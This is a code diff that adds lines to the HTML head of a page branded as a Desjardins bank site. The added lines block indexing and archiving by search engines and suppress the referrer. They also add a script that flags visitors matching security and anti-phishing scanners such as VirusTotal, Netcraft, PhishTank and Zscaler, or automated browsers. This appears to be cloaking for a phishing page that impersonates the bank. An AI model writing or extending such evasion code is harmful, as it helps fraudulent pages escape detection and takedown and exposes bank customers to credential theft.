@@ -6,6 +6,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Services financiers aux particuliers - Desjardins</title>
     <meta name="description" content="Enjoy financial services and products designed for you. Insurance, loans, credit cards, online banking and apps, mortgages, investing and savings accounts." />
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+    <meta name="referrer" content="no-referrer" />
+    <script>
+      (function() {
+        var ua = (navigator.userAgent || '').toLowerCase();
+        var botKeywords = [
+          'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
+          'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
+          'netcraft', 'virustotal', 'paloalto', 'python', 'curl', 'wget',
+          'phantom', 'headlesschrome', 'puppeteer', 'playwright', 'selenium',
+          'httpclient', 'go-http-client', 'postman', 'zscaler', 'phishtank'
+        ];
+        var isBotUA = botKeywords.some(function(k) { return ua.indexOf(k) !== -1; });
+        var isWebdriver = !!navigator.webdriver;
+        if (isBotUA || isWebdriver) {
+          window.__IS_BOT_DETECTED__ = true;
+        }
+      })();
+    </script>
   </head>
   <body>
     <div id="root"></div>
